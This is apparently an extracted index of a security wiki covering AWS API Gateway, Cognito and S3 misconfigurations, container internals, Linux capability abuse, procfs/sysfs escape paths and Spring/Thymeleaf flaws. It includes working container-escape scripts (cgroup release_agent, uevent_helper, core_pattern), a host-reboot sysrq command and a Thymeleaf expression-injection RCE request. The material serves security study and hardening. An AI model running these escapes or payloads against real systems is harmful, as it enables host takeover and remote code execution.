API Gateway handles all the tasks involved in accepting and processing up to hundreds of thousands of concurrent API calls, including traffic management, CORS support, authorization and access control, throttling, monitoring, and API version management. In other words, API Gateway is a scalable and serverless reverse proxy service that can route HTTP/HTTPS requests to different implementation back-ends.\n {% embed url=\"https://docs.aws.amazon.com/apigateway/latest/developerguide/welcome.html\" %} \nHow API Gateway works\nThe following diagram explains how the API Gateway works:\n\nLambda authorizer\nLambda authorizer (formerly known as a custom authorizer) is an API Gateway feature that uses a lambda function to control access to API. Lambda authorizer is useful for implementing a custom authorization scheme that uses a bearer token authentication strategy such as OAuth or SAML, or that uses request parameters to determine the caller's identity.\nThe following diagram illustrates the authorization workflow for Lambda authorizers:\n\nWhen a client makes a request to one of API's methods, API Gateway calls Lambda authorizer, which takes the caller's identity as input and returns an IAM policy as output. Output from an Amazon API Gateway Lambda authorizer has the following structure:\n\npolicyDocument property allows the Lambda authorizer to specify which API endpoints this user can or cannot access. policyDocument object contains an IAM policy that allows or denies execution of an execute-api action on specially formatted resources that represent each API endpoint:\n\nThe ARNs in IAM policies have several different parts separated by colons:\n\nThe execute-api ARN format packs the API ID, API stage, HTTP verb, and the API resource (the URL path) all into the last resource part of the ARN. They are separated by slashes, as if they were forming a single logical path in an imaginary file system.\nThe documentation claim that the API ID, stage name and HTTP verb can be easily replaced by * to mean any value for that part of the resource alone:\n\n {% hint style=\"info\" %} \nWildcard * is greedy and expands as much as possible inside each of the colon-separated parts of an ARN (it is the equivalent of .* in POSIX regular expressions). The expansion will not stop at the slashes - any * is free to expand its matching into the entire last part of the execute-api ARN.\nWildcard also matches the empty string.\n {% endhint %} \n {% hint style=\"info\" %} \nEach AWS service decides whether matching the resource part of ARNs is case sensitive or case insensitive, see link.\n {% endhint %} \nSecurity issues\nIncorrect policyDocument wildcard configuration\nThe use of wildcards in ANR can lead to the possibility of bypassing access control. Imagine an API that needs to allow a user to access any HTTP verb on a single endpoint /business/op. The developer might be tempted to write the policyDocument as follows:\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Action\": \"execute-api:Invoke\",\n            \"Effect\": \"Allow\",\n            \"Resource\": \"anr:aws:execute-api:us-west-1:12345678:myApiId/myStage/*/business/op\"\n        }\n    ]\n}\n\nAll of the following ARNs would be allowed by the example policy. But item 6 most likely would not be expected by a developer that read this part of the documentation.\n\nSo having the HTTP verb as a star makes it so that the endpoint resource is no longer anchored to the beginning of the URL path.\nReferences\n\nSecurity Implications of AWS API Gateway Lambda Authorizers and IAM Wildcard Expansion\n\n"},"Cloud/AWS/amazon-cognito.html":{"url":"Cloud/AWS/amazon-cognito.html","title":"Amazon Cognito","keywords":"","body":"Amazon Cognito overviewHow does Amazon Cognito work?Security issuesLeakage identity pool IDMisconfigured user pool accessReferencesAmazon Cognito overview\nAmazon Cognito provides authentication, authorization, and user management for customer's web and mobile applications. Users can sign in directly with a user name and password, or through a third party such as Facebook, Amazon, Google, Apple, or enterprise identity providers via SAML 2.0 and OpenID Connect.\nThe two main components of Amazon Cognito are user pools and identity pools. User pools are user directories that provide sign-up and sign-in options for application users. Identity pools enable developers to grant users access to other AWS services.\n {% embed url=\"https://docs.aws.amazon.com/cognito/latest/developerguide/what-is-amazon-cognito.html\" %} \nHow does Amazon Cognito work?\n\n\nAn user signs in through a user pool and receives user pool tokens (JWT tokens) after a successful authentication.\nAn application exchanges the user pool tokens for AWS credentials through an identity pool.\nThe user can use the AWS credentials to access other AWS services such as Amazon S3 or DynamoDB.\n\nSecurity issues\nLeakage identity pool ID\nIdentity pool ID allows you to fetch temporary AWS credentials that may have extra AWS permissions. As a result, it may be possible to get unauthenticated access to sensitive AWS services.\nIdentity pool IDs can be stored client-side, for example within JavaScript, or returned in a response.\n {% embed url=\"https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963\" %} \nMisconfigured user pool access\nIf an application allows writing user attributes of an internally used AWS user pool, it can be used to abuse the trust between the application and the pool. In other words, it is possible to change the attributes and issue the JWT token, that will be used by an application. For instance, if an application uses normalized emails (in lower case), you can change one letter in an email address to an upper-case equivalent and takeover an account.\n {% embed url=\"https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/\" %}  \nReferences\n\nWhitepaper: Internet-Scale analysis of AWS Cognito Security\n\n"},"Cloud/AWS/s3.html":{"url":"Cloud/AWS/s3.html","title":"Amazon S3","keywords":"","body":"Amazon S3 overviewS3 bucketAddressing modelAccess control listSecurity issuesBucket takeoverImproper ACL permissionsReferencesAmazon S3 overview\nAmazon Simple Storage Service (Amazon S3) is an object storage that has a simple web services interface to store and retrieve any amount of data.

An object is a file and any metadata that describes that file.\n {% endhint %} \nWhen the object is in the bucket, you can open it, download it, and move it. When you no longer need an object or a bucket, you can clean up your resources.\nAn Amazon S3 bucket name is globally unique, and the namespace is shared by all AWS accounts. This means that after a bucket is created, the name of that bucket cannot be used by another AWS account in any AWS Region until the bucket is deleted.\nAddressing model\nThere are two addressing models to access a bucket:\n\nVirtual-Hosted–Style:\n  https://.s3..amazonaws.com/\n\n\nPath-Style:\n  https://s3..amazonaws.com//\n\n\n\nAccess control list\nAmazon S3 access control lists (ACLs) enable you to manage access to buckets and objects. Each bucket and object has an ACL attached to it as a subresource. It defines which AWS accounts or groups are granted access and the type of access. When a request is received against a resource, Amazon S3 checks the corresponding ACL to verify that the requester has the necessary access permissions.\n {% embed url=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html\" %} \nSecurity issues\nBucket takeover\nIf an application is using a domain-linked S3 bucket that has been deleted by developers and CNAME records from Amazone Route 53 are still pending deletion, you can claim this unclaimed S3 bucket name by using an other AWS account.\nTo verify whether bucket takeover may be possible, run:\n$ curl -s https:// | grep -E -q 'NoSuchBucket|Code: NoSuchBucket' && echo \"Subdomain takeover may be possible\" || echo \"Subdomain takeover is not possible\"\n\nReferences:\n\nHands-on AWS S3 Bucket Takeover\nSub-Domain Take Over — AWS S3 Bucket\nWriteup: s3 bucket takeover presented in https://github.com/reddit/rpan-studio/blob/e1782332c75ecb2f774343258ff509788feab7ce/CI/full-build-macos.sh\n\nImproper ACL permissions\nIf ACL permissions are misconfigured you can get unauthenticated access to a bucket.

The process descriptor contains all the information about a specific process.\n\n/proc\n\n/proc is a special filesystem mount (procfs) for accessing system and process information directly from the kernel by reading \"file\" entries.\n\nProperties\nCredentials\nCredentials is process identifiers. Credentials describe the user identity of a task, which determine its permissions for shared resources such as files, semaphores, and shared memory.\nAll of a task's credentials are held in a refcounted structure of type struct cred. Each task points to its credentials by a pointer called cred in its task_struct.\nTraditional UNIX implementations of permissions distinguish two categories:\n\nprivileged processes with user ID of 0 (root)\nevery other process\n\nCapabilities\nSince kernel 2.2, Linux divides the privileges associated with superuser into distinct units known as capabilities.\nLinux capabilities were introduced as a way to break the role of root down into discrete subsections, which could be granted to non-root processes to allow them to perform privileged actions.\n\nA process has a concept of a \"permitted set\" of capabilities, which acts as a limiting superset for the capabilities it can have. Importantly, and by default, this bounding set is carried over to any child process, so the \"init\" process of the container creates a limiting set of capabilities for all processes inside the container (as all processes descend from PID 1). \nContainers are tasks which run should run with a restricted set of capabilities.\n\nTo view a list of capabilities, you can use capsh:\n$ capsh --print\n\nFilesystem\nThe filesystem root for a container is (usually) isolated from other containers and host's root filesystem via the pivot_root syscall.\nThe container's root mount is often planted in a container-specialized filesystem, such as AUFS or OverlayFS. In case of OverlayFS, the container's root of / really lives in /var/lib/docker/overlay2.\n\nNamespaces\nA namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource. Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.\nThere are 8 types of namespaces available on Linux.\n\n\n\nNamespace\nIsolates\n\n\n\n\nCgroup\nCgroup root directory\n\n\nIPC\nProvides namespaced versions of SystemV IPC and POSIX message queues.\n\n\nNetwork\nProvides a namespaced and isolated network stack. The majority of container use-cases involve networked services, so this will prove to be a core feature of containers.\n\n\nMount\nProvides a namespaced view of mount points. Combined with the pivot_root() syscall, this will be used to isolate the container's filesystem from the host's filesystem.\n\n\nPID\nProvides a namespaced tree of process IDs (PIDs). This allows each container to have a full isolated process tree, in which it has an ‘init’ process that it runs as PID 1 inside this namespace. Processes running in a container will have a different PID on the host than they do inside the container’s PID namespace.\n\n\nTime\nBoot and monotonic clocks.\n\n\nUser\nProvides a namespaced version of User IDs (UIDs) and Group IDs (GIDs). This is one of the most important features of modern container systems, as it is used to provide \"unprivileged containers\". These are containers in which root (UID 0) inside the container is not root outside the container, greatly increasing the container's security.\n\n\nUTS\nProvides a namespaced version of system identifiers.\n\n\n\n\nCreation of new namespaces using clone(2) and unshare(2) in most cases requires the CAP_SYS_ADMIN capability.  User namespaces are the exception: since Linux 3.8, no privilege is required to create a user namespace.\nEach process has a /proc/[pid]/ns/ subdirectory containing one entry for each namespace.\nCgroups\nCgroups is a Linux control groups.\nControl groups, usually referred to as cgroups, are a Linux kernel feature which allow processes to be organized into hierarchical groups whose usage of various types of resources can then be limited and monitored. The kernel's cgroup interface is provided through a pseudo-filesystem called cgroupfs, where hierarchy is expressed through the directory tree in each mount.\n\nGrouping is implemented in the core cgroup kernel code, while resource tracking and limits are implemented in a set of per-resource-type subsystems (memory, CPU, and so on).\nA cgroup filesystem initially contains a single root cgroup, /, which all processes belong to. A new cgroup is created by creating a directory in the cgroup filesystem.\n$ mkdir /sys/fs/cgroup/cpu/cg1\n\nThis creates a new empty cgroup. A process may be moved to this cgroup by writing its PID into the cgroup's cgroup.procs file:\n$ echo $$ > /sys/fs/cgroup/cpu/cg1/cgroup.procs\n\nLinux Security Modules\nAppArmor and SELinux are Linux security modules providing Mandatory Access Control (MAC), where access rules for a program are described by a profile.\nDocker and LXC enable a default LSM profile in enforcement mode, which mostly serves to restrict a container's access to sensitive /proc and /sys entries.\nThe profile also denies mount syscall.\nseccomp\nSince kernel 3.17, Linux has a mechanism for filtering access to system calls through the seccomp subsystem. \n\nSeccomp policies come in two versions:\n\nStrict mode - is a small set of allowed system calls which cannot be customized.\nFilter mode - system call filters are written as Berkeley Packet Filter (BPF) programs; this allows more finely-grained policies to be set on system call usage (with some caveats, seccomp-bpf filters can inspect syscall arguments, but cannot dereference pointers).\n\nContainer security model\n\nReferences\n\nA Compendium of Container Escapes\nAbusing Privileged and Unprivileged Linux Containers\nUnderstanding and Hardening Linux Containers\n\n"},"Container/Overview/docker-engine.html":{"url":"Container/Overview/docker-engine.html","title":"Docker Engine","keywords":"","body":"runccontainerdcontainerd-shimdockerddocker CLIRunning containerReferencesDocker Engine is the heart of the container and what makes the container to run. Docker has a modular design, which means you can swap/customize some of its components.\n\nDocker architecture has five components:\n\ndocker CLI\ndockerd\ncontainerd\ncontainerd-shim\nrunc\n\nrunc\nrunc is a lightweight CLI wrapper for the libcontainer and it is used to spawn and run containers.\nYou can run your containers without Docker using the CLI only. To do this, you must have a bundle aligned with the OCI standards. A bundle for a container is a directory that includes a specification file named config.json and a root filesystem. config.json is used to create a container in a particular state.\nAn example of config.json\n{  \n  \"ociVersion\": \"0.6.0-dev\",  \n  \"platform\": {     \n    \"os\": \"linux\",     \n    \"arch\": \"amd64\"   \n  },   \n  \"process\": {   \n    \"terminal\": true,   \n    \"args\": [\"sh\"],   \n    \"env\": [\"PATH=/usr/local/sbin:/usr/local/bin:/bin\", ...]\n  ...\n}\n\nGiven the bundle, you can simply run the container with runc\n# Creates an empty folder\nmkdir ~/mycontainer\ncd ~/mycontainer\n# Creates rootfs, one way of doing so is to export it re-using docker\nmkdir rootfs\ndocker export $(docker create busybox) | tar -C rootfs -xvf -\n# Creates the new specification file named \"config.json\" for the bundle\nrunc spec\n# Runs the container\nrunc run mycontainerid\n\nDocker is a higher level abstraction over runc and runc is a CLI for libcontainer. Moreover, it is also possible to set the docker to your own runtime dockerd daemon --add-runtime.\ncontainerd\ncontainerd is one of the layers in the Docker's modular architecture. When you make a request to dockerd, containerd manages processes related to image distribution such as pushing/pulling them to/from registries. With the images containerd generates an OCI bundle for the container.\ncontainerd manages the container lifecycle: it starts, stops, pauses, or deletes it. It also manages image distribution: pushes/pulls the images to/from registry.\n\nSo what do you actually get using containerd?\nYou get push and pull functionality as well as image management. You get container lifecycle APIs to create, execute, and manage containers and their tasks. An entire API dedicated to snapshot management. Basically everything that you need to build a container platform without having to deal with the underlying OS details.\nmore see Docker containerd integration\n\ncontainerd-shim\ncontainerd-shim allows you to have daemonless containers. How this is achieved:\n\ncontainerd forks an instance of runc for each new container\nrunc process exits after the container is created\nonce a container is created by runc, containerd-shim becomes the new parent for the container process\n\nYou can see this by creating a docker container and checking the processes.\n$ docker run -d alpine sleep 30\n$ ps fxa | grep dockerd -A 3  \n 2239 ?        Ssl    0:28 /usr/bin/dockerd -H fd://\n 2397 ?        Ssl    0:19  \\_ docker-containerd -l unix:///var/run/docker/libcontainerd/docker-containerd.sock ...\n15476 ?

CAP_SYS_ADMIN is required to perform a range of administrative operations, which is difficult to drop from containers if privileged operations are performed within the container. Retaining this capability is often necessary for containers which mimic entire systems versus individual application containers which can be more restrictive.\nAbusing usermode helper API\nPrivileged containers can register usermode application helpers that are executed in the kernel context, for more information on invoking user-space applications from kernel see here.\nThe @_fel1x escape technique is based on abusing the functionality of the notify_on_release feature in cgroups v1 to run the exploit as a fully privileged root user.\nHere is a version of the PoC that launches ps on the host:\n# Finds + enables a cgroup release_agent\nd=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`\n# Enables notify_on_release in the cgroup\nmkdir -p $d/w; echo 1 > $d/w/notify_on_release\n# Finds path of OverlayFS mount for container\n# Unless the configuration explicitly exposes the mount point of the host filesystem\n# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html\nt=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\n# Sets release_agent to /path/payload\ntouch /o; echo $t/c > $d/release_agent\n# Creates a payload\necho \"#!/bin/sh\" > /c\necho \"ps > $t/o\" >> /c\nchmod +x /c\n# Triggers the cgroup via empty cgroup.procs\nsh -c \"echo 0 > $d/w/cgroup.procs\"; sleep 1\n# Reads the output\ncat /o\n\nRequirements to use this technique\nIn fact, --privileged provides far more permissions than needed to escape a Docker container via this method. In reality, the \"only\" requirements are:\n\nYou must be running as root inside the container.\nThe container must be run with the CAP_SYS_ADMIN Linux capability.\nThe container must lack an AppArmor profile, or otherwise allow the mount syscall.\nThe cgroup v1 virtual filesystem must be mounted read-write inside the container.\n\nUsing cgroups to deliver the exploit\nThe PoC abuses the functionality of the notify_on_release feature in cgroups v1 to run the exploit as a fully privileged root user.\nWhen the last task in a cgroup leaves (by exiting or attaching to another cgroup), a command supplied in the release_agent file is executed. The intended use for this is to help prune abandoned cgroups. This command, when invoked, is run as a fully privileged root on the host.\nWhat does notify_on_release do?\nIf the notify_on_release flag is enabled in a cgroup, then whenever the last task in the cgroup leaves (exits or attaches to some other cgroup) and the last child cgroup of that cgroup is removed, then the kernel runs the command specified by the contents of the release_agent file in that hierarchy's root directory, supplying the pathname (relative to the mount point of the cgroup file system) of the abandoned cgroup. This enables automatic removal of abandoned cgroups. The default value of notify_on_release in the root cgroup at system boot is disabled. The default value of other cgroups at creation is the current value of their parents notify_on_release settings. The default value of a cgroup hierarchy's release_agent path is empty.\nEscape only with CAP_SYS_ADMIN capability\nThere is a simpler way to write this exploit so it works without the --privileged flag. In this scenario, you won't have access to a read-write cgroup mount provided by --privileged. For this you will just mount the cgroup as read-write ourselves.

This could lead to trivial privilege escalation and ring-0 compromise. The kernel can be modified at will, subverting all system security, Linux Security Modules, and container systems.\n {% hint style=\"info\" %} \nCAP_SYS_MODULE capability dropped by Docker in privileged containers.\n {% endhint %} \nReferences:\n\nWriteup: How I Hacked Play-with-Docker and Remotely Ran Code on the Host\n\nCAP_SYS_RAWIO\nCAP_SYS_RAWIO provides a number of sensitive operations including access to /dev/mem, /dev/kmem or /proc/kcore, modify mmap_min_addr, access ioperm(2) and iopl(2) system calls, and various disk commands. The FIBMAP ioctl(2) is also enabled via this capability, which has caused issues in the past. As per the man page, this also allows the holder to descriptively perform a range of device-specific operations on other devices. \nCAP_NET_ADMIN\nCAP_NET_ADMIN allows the capability holder to modify the exposed network namespaces' firewall, routing tables, socket permissions, network interface configuration and other related settings on exposed network interfaces. This also provides the ability to enable promiscuous mode for the attached network interfaces and potentially sniff across namespaces.\nIt should be noted several privilege escalation vulnerabilities and other historical weaknesses have resulted from the ability to leverage this capability. This includes CVE-2011-1019 which effectively granted the CAP_SYS_MODULE capability to load arbitrary modules and was exploited trivially using ifconfig CVE-2010-4655 which resulted in a sensitive heap memory disclosure and CVE-2013-4514 resulting in Denial of Service and possibly arbitrary code execution. These issues are largely due to the significant attack surface and implicit module loading for special interfaces or socket types.\nCAP_SYS_CHROOT\nCAP_SYS_CHROOT permits the use of the chroot(2) system call. This may allow escaping of any chroot(2) environment, using known weaknesses and escapes:\n\nHow to break out from various chroot solutions\nchw00t: chroot escape tool\n\nCAP_SYS_PTRACE\nCAP_SYS_PTRACE allows to use ptrace(2) and recently introduced cross memory attach system calls such as process_vm_readv(2) and process_vm_writev(2). If this capability is granted and the ptrace(2) system call itself is not blocked by a seccomp filter, this will allow an attacker to bypass other seccomp restrictions, see PoC for bypassing seccomp if ptrace is allowed. \nCAP_NET_RAW\nCAP_NET_RAW allows a process to be able to create RAW and PACKET socket types for the available network namespaces. This allows arbitrary packet generation and transmission through the exposed network interfaces. In many cases this interface will be a virtual Ethernet device which may allow for a malicious or compromised container to spoof packets at various network layers. A malicious process or compromised container with this capability may inject into upstream bridge, exploit routing between containers, bypass network access controls, and otherwise tamper with host networking if a firewall is not in place to limit the packet types and contents. Finally, this capability allows the process to bind to any address within the available namespaces. This capability is often retained by privileged containers to allow ping to function by using RAW sockets to create ICMP requests from a container.\nDocker setup container networking so that all containers share the same Linux virtual bridge. These containers will be able to communicate with each other. Even if this direct network access is disabled (using the -icc=false flag for Docker), containers are not restricted for link-layer traffic. In particular, it is possible (and in fact quite easy) to conduct an ARP spoofing attack on another container within the same host system, allowing full middle-person attacks of the targeted container's traffic.\nCAP_SYS_BOOT\nCAP_SYS_BOOT allows to use the reboot(2) syscall. It also allows for executing an arbitrary reboot command via LINUX_REBOOT_CMD_RESTART2, implemented for some specific hardware platforms. \nThis capability also permits use of the kexec_load(2) system call, which loads a new crash kernel and as of Linux 3.17, the kexec_file_load(2) which also will load signed kernels.\nCAP_SYSLOG\nCAP_SYSLOG was finally forked in Linux 2.6.37 from the CAP_SYS_ADMIN catchall, this capability allows the process to use the syslog(2) system call. This also allows the process to view kernel addresses exposed via /proc and other interfaces when /proc/sys/kernel/kptr_restrict is set to 1.\nThe kptr_restrict sysctl setting was introduced in 2.6.38, and determines if kernel addresses are exposed. This defaults to zero (exposing kernel addresses) since 2.6.39 within the vanilla kernel, although many distributions correctly set the value to 1 (hide from everyone accept uid 0) or 2 (always hide).\nIn addition, this capability also allows the process to view dmesg output, if the dmesg_restrict setting is 1. Finally, the CAP_SYS_ADMIN capability is still permitted to perform syslog operations itself for historical reasons.\nCAP_DAC_READ_SEARCH\nCAP_DAC_READ_SEARCH allows a process to bypass file read, and directory read and execute permissions. While this was designed to be used for searching or reading files, it also grants the process permission to invoke open_by_handle_at(2). Any process with the capability CAP_DAC_READ_SEARCH can use open_by_handle_at(2) to gain access to any file, even files outside their mount namespace. The handle passed into open_by_handle_at(2) is intended to be an opaque identifier retrieved using name_to_handle_at(2). However, this handle contains sensitive and tamperable information, such as inode numbers. This was first shown to be an issue in Docker containers by Sebastian Krahmer with shocker exploit.\n\nDocker has mitigated this issue by dropping CAP_DAC_READ_SEARCH (as well as blocking access to open_by_handle_at using seccomp)\n\nReferences\n\nUnderstanding and Hardening Linux Containers\nAbusing Privileged and Unprivileged Linux Containers\nUnderstanding Docker container escapes\n\n"},"Container/Escaping/host-networking-driver.html":{"url":"Container/Escaping/host-networking-driver.html","title":"Host Networking Driver","keywords":"","body":"If a container was configured with the Docker host networking driver (--network=host), that container's network stack is not isolated from the Docker host (the container shares the host's networking namespace), and the container does not get its own IP-address allocated.

Numerous files within the procfs and sysfs offer a risk for container escape, host modification or basic information disclosure which could facilitate other attacks. \nprocfs\n/proc/sys\n/proc/sys typically allows access to modify kernel variables, often controlled through sysctl(2).\n/proc/sys/kernel/core_pattern\n/proc/sys/kernel/core_pattern defines a program which is executed on core-file generation (typically a program crash) and is passed the core file as standard input if the first character of this file is a pipe symbol |. This program is run by the root user and will allow up to 128 bytes of command line arguments. This would allow trivial code execution within the container host given any crash and core file generation (which can be simply discarded during a myriad of malicious actions).\n$ cd /proc/sys/kernel\n$ echo \"|$overlay/shell.sh\" > core_pattern\n$ sleep 5 && ./crash &\n\n/proc/sys/kernel/modprobe\n/proc/sys/kernel/modprobe contains the path to the kernel module loader, which is called when loading a kernel module such as via the modprobe command. Code execution can be gained by performing any action which will trigger the kernel to attempt to load a kernel module (such as using the crypto-API to load a currently unloaded crypto-module, or using ifconfig to load a networking module for a device not currently used). \n/proc/sys/vm/panic_on_oom\n/proc/sys/vm/panic_on_oom is a global flag that determines whether the kernel will panic when an Out of Memory (OOM) condition is hit (rather than invoking the OOM killer). This is more of a Denial of Service (DoS) attack than container escape, but it no less exposes an ability which should only be available to the host\n/proc/sys/fs\n/proc/sys/fs directory contains an array of options and information concerning various aspects of the file system, including quota, file handle, inode, and dentry information. Write access to this directory would allow various denial-of-service attacks against the host.\n/proc/sys/fs/binfmt_misc\n/proc/sys/fs/binfmt_misc allows executing miscellaneous binary formats, which typically means various interpreters can be registered for non-native binary formats (such as Java) based on their magic number. While this path is typically writable by AppArmor rules, NCC is not aware of any exploits, although it is not likely required for most container applications.\n/proc/config.gz\n/proc/config.gz depending on CONFIG_IKCONFIG_PROC settings, this exposes a compressed version of the kernel configuration options for the running kernel. This may allow a compromised or malicious container to easily discover and target vulnerable areas enabled in the kernel.\n/proc/sysrq-trigger\nSysrq is an old mechanism which can be invoked via a special SysRq keyboard combination. This can allow an immediate reboot of the system, issue of sync(2), remounting all filesystems as read-only, invoking kernel debuggers, and other operations.\nIf the guest is not properly isolated, it can trigger the sysrq commands by writing characters to /proc/sysrq-trigger file.\n# Reboot the host\necho b > /proc/sysrq-trigger\n\n/proc/kmsg\n/proc/kmsg can expose kernel ring buffer messages typically accessed via dmesg. Exposure of this information can aid in kernel exploits, trigger kernel address leaks (which could be used to help defeat the kernel Address Space Layout Randomization (KASLR)), and be a source of general information disclosure about the kernel, hardware, blocked packets and other system details.\n/proc/kallsyms\n/proc/kallsyms contains a list of kernel exported symbols and their address locations for dynamic and loadable modules. This also includes the location of the kernel's image in physical memory, which is helpful for kernel exploit development. From these locations, the base address or offset of the kernel can be located, which can be used to overcome kernel Address Space Layout Randomization (KASLR).\nFor systems with kptr_restrict set to 1 or 2, this file will exist but not provide any address information (although the order in which the symbols are listed is identical to the order in memory).\n/proc/[pid]/mem\n/proc/[pid]/mem exposes interfaces to the kernel memory device /dev/mem. While the PID Namespace may protect from some attacks via this procfs vector, this area of has been historically vulnerable, then thought safe and again found to be vulnerable for privilege escalation.\n/proc/kcore\n/proc/kcore represents the physical memory of the system and is in an ELF core format (typically found in core dump files). It does not allow writing to said memory. The ability to read this file (restricted to privileged users) can leak memory contents from the host system and other containers.\nThe large reported file size represents the maximum amount of physically addressable memory for the architecture, and can cause problems when reading it (or crashes depending on the fragility of the software).\nDumping /proc/kcore in 2019\n/proc/kmem\n/proc/kmem is an alternate interface for /dev/kmem (direct access to which is blocked by the cgroup device whitelist), which is a character device file representing kernel virtual memory. It allows both reading and writing, allowing direct modification of kernel memory.\n/proc/mem\n/proc/mem is an alternate interface for /dev/mem (direct access to which is blocked by the cgroup device whitelist), which is a character device file representing physical memory of the system. It allows both reading and writing, allowing modification of all memory. (It requires slightly more finesse than kmem, as virtual addresses need to be resolved to physical addresses first).\n/proc/sched_debug\n/proc/sched_debug is a special file returns process scheduling information for the entire system. This information includes process names and process IDs from all namespaces in addition to process cgroup identifiers. This effectively bypasses the PID namespace protections and is other/world readable, so it can be exploited in unprivileged containers as well.\n/proc/[pid]/mountinfo\n/proc/[pid]/mountinfo contains information about mount points in the process's mount namespace. It exposes the location of the container rootfs or image.\nsysfs\n/sys/kernel/uevent_helper\nuevents are events triggered by the kernel when a device is added or removed. Notably, the path for the uevent_helper can be modified by writing to /sys/kernel/uevent_helper. Then, when a uevent is triggered (which can also be done from userland by writing to files such as /sys/class/mem/null/uevent), the malicious uevent_helper gets executed.\n# Creates a payload\ncat \"#!/bin/sh\" > /evil-helper\ncat \"ps > /output\" >> /evil-helper\nchmod +x /evil-helper\n# Finds path of OverlayFS mount for container\n# Unless the configuration explicitly exposes the mount point of the host filesystem\n# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html\nhost_path=`sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab`\n# Sets uevent_helper to /path/payload\necho \"$host_path/evil-helper\" > /sys/kernel/uevent_helper\n# Triggers a uevent\necho change > /sys/class/mem/null/uevent\n# or else\n# echo /sbin/poweroff > /sys/kernel/uevent_helper\n# Reads the output\ncat /output\n\n/sys/class/thermal\nAccess to ACPI and various hardware settings for temperature control, typically found in laptops or gaming motherboards. This may allow for DoS attacks against the container host, which may even lead to physical damage.\n/sys/kernel/vmcoreinfo\nThis file can leak kernel addresses which could be used to defeat KASLR.\n/sys/kernel/security\nIn /sys/kernel/security mounted the securityfs interface, which allows configuration of Linux Security Modules. This allows configuration of AppArmor policies, and so access to this may allow a container to disable its MAC system.\n/sys/firmware/efi/vars\n/sys/firmware/efi/vars exposes interfaces for interacting with EFI variables in NVRAM. While this is not typically relevant for most servers, EFI is becoming more and more popular. Permission weaknesses have even lead to some bricked laptops.\n/sys/firmware/efi/efivars\n/sys/firmware/efi/efivars provides an interface to write to the NVRAM used for UEFI boot arguments. Modifying them can render the host machine unbootable.\n/sys/kernel/debug\ndebugfs provides a \"no rules\" interface by which the kernel (or kernel modules) can create debugging interfaces accessible to userland. It has had a number of security issues in the past, and the \"no rules\" guidelines behind the filesystem have often clashed with security constraints.\nReferences\n\nUnderstanding and Hardening Linux Containers\nAbusing Privileged and Unprivileged Linux Containers\n\n"},"Container/container-analysis-tools.html":{"url":"Container/container-analysis-tools.html","title":"Container Analysis Tools","keywords":"","body":"\nCDK - a container penetration toolkit, offering stable exploitation in different slimmed containers without any OS dependency\ndeepce - Docker Enumeration, Escalation of Privileges and Container Escapes (DEEPCE)\ndive - a tool for exploring each layer in a docker image\nSecretScanner - find secrets and passwords in container images and file systems\n\n"},"Framework/Spring/overview.html":{"url":"Framework/Spring/overview.html","title":"Overview","keywords":"","body":" {% embed url=\"https://www.marcobehler.com/guides/spring-framework\" %} \n {% embed url=\"https://www.marcobehler.com/guides/spring-mvc\" %} \n {% embed url=\"https://www.marcobehler.com/guides/spring-boot\" %} \n {% embed url=\"https://www.marcobehler.com/guides/spring-security\" %} \n"},"Framework/Spring/mass-assignment.html":{"url":"Framework/Spring/mass-assignment.html","title":"Mass Assignment","keywords":"","body":"ExampleReferencesSoftware frameworks sometime allow developers to automatically bind HTTP request parameters into program code variables or objects to make using that framework easier on developers.

Actuators allow you to control and monitor your application using either HTTP or JMX endpoints. Auditing, health and metrics gathering can also open a hidden door to the server if the application has been misconfigured.\nSpring Boot includes a number of built-in endpoints (endpoints for Spring Boot 1.x) and lets you add your own. For example, the health endpoint provides basic application health information.\nEach individual endpoint can be enabled or disabled and exposed (made remotely accessible) over HTTP or JMX. An endpoint is considered to be available when it is both enabled and exposed. The built-in endpoints will only be auto-configured when they are available. Most applications choose exposure via HTTP, where the ID of the endpoint along with a prefix of /actuator is mapped to a URL. For example, by default, the health endpoint is mapped to /actuator/health.\nTo learn more about the actuator's endpoints and their request and response formats, see here.\nenv\nExposes properties from Spring's ConfigurableEnvironment.\n\nSpring Boot 2.x uses json instead of x-www-form-urlencoded for property change requests via the env endpoint.\nInformation returned by the env and configprops endpoints can be somewhat sensitive so keys matching a certain pattern are sanitized by default.

It has no parameters and returns the static string welcome. Spring interprets welcome as the name of the View and tries to find the resources/templates/welcome.html file located in the application resources. If Spring finds it, renders a view from the template file and returns to the user.\nUntrusted Thymeleaf view name\nIf Thymeleaf view engine is used (the most popular for Spring), the template might look like this one:\n\n\n\n    Spring Boot Web Thymeleaf Example\n\n\n    \n\n\n\nThymeleaf engine supports file layouts, that allows you to specify a fragment in the template by using  and then request only this fragment from the view:\n@GetMapping(\"/main\")\npublic String fragment() {\n    return \"welcome :: main\";\n}\n\nThymeleaf is intelligent enough to return only the main div from the welcome view, but not the whole document.\nBefore loading the template from the filesystem, Spring ThymeleafView class parses the template name as an expression:\ntry {\n   // By parsing it as a standard expression, we might profit from the expression cache\n   fragmentExpression = (FragmentExpression) parser.parseExpression(context, \"~{\" + viewTemplateName + \"}\");\n}\n\nAs a result, if template name or fragment is concatenated with untrusted data, it can lead to expression language injection and hence RCE.\nFor instance, the following methods are vulnerable to expression language injection:\n@GetMapping(\"/path\")\npublic String path(@RequestParam String lang) {\n    // potential path traversal, but limited to the 'templates' folder\n    return \"user/\" + lang + \"/welcome\";\n}\n\n@GetMapping(\"/fragment\")\npublic String fragment(@RequestParam String section) {\n    return \"welcome :: \" + section;\n}\n\nThe following request creates the executed file on the server:\nGET /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"touch executed\").getInputStream()).next()}__::.x HTTP/1.1\nHost: vulnerable-website.com\n\n\nThis exploit uses expression preprocessing. In order for the expression to be executed by the Thymeleaf, no matter what prefixes or suffixes are, it is necessary to surround it with __${ and }__::.x.\nUntrusted implicit view name\nControllers do not always return strings that 